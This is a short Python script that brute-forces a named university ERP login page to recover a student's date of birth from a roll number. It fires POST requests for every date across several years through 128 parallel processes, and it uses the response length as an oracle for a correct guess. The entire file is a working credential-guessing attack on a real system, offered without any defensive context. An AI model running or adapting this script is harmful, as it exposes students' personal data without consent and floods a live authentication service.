import requests
import multiprocessing as mp
import datetime
import ctypes

URL = 'https://erp.iitkgp.ac.in/StudentPerformanceV2/auth/authenticate.htm'
PROCS = 128

def checkDate(params):
	roll, date, ret = params[0], params[1], params[2]
	if ret.value == '':
		dob = date.strftime('%d-%m-%Y')
		if __name__ == '__main__':
			print(f'Checking {dob}...')
		data = {
			'rollno' : roll,
			'dob' : dob
		}
		response = requests.post(URL, data=data)
		if len(response.text) != 14181:
			ret.value = dob

def getDOB(roll):
	year = 2000 + int(roll[:2]) - 18
	start = datetime.date(year - 1, 1, 1)
	end = datetime.date(year + 1, 12, 31)
	delta = end - start

	pool = mp.Pool(processes=PROCS)
	man = mp.Manager()
	ret = man.Value(ctypes.c_char_p, '')
	
	pool.map(checkDate, [(roll, start + datetime.timedelta(i), ret) for i in range(delta.days + 1)])
	pool.close()
	pool.join()

	if ret.value == '':
		start = datetime.date(year - 2, 1, 1)
		end = datetime.date(year - 2, 12, 31)
		ret = man.Value(ctypes.c_char_p, '')

		pool = mp.Pool(processes=PROCS)
		man = mp.Manager()
		ret = man.Value(ctypes.c_char_p, '')

		pool.map(checkDate, [(roll, start + datetime.timedelta(i), ret) for i in range(delta.days + 1)])
		pool.close()
		pool.join()
	
	return ret.value


if __name__ == '__main__':
	print( getDOB(input('Roll Number: ')) )